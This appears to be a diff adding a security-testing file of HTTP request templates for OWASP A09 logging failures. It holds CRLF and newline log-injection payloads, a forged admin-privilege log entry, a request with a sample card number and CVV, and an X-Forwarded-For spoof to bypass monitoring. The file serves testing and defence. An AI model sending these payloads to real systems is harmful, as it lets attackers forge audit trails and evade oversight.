@@ -1,0 +1,35 @@
+# OWASP Top 10 - A09:2021 Security Logging and Monitoring Failures
+# Défaillances de journalisation
+
+### Log Injection - CRLF
+POST /login HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+username=admin%0d%0aINFO: User admin logged in successfully
+
+### Log Injection - Newline
+GET /search?q=test%0aADMIN_ACCESS_GRANTED HTTP/1.1
+Host: {{host}}
+
+### Log Forging
+POST /api/log HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 80
+
+{"message": "User login\nINFO: Admin privileges granted to attacker"}
+
+### Sensitive Data in Logs
+POST /api/payment HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 100
+
+{"card_number": "4532123456789012", "cvv": "123", "amount": 1000}
+
+### Bypassing Monitoring
+GET /admin HTTP/1.1
+Host: {{host}}
+X-Forwarded-For: 127.0.0.1
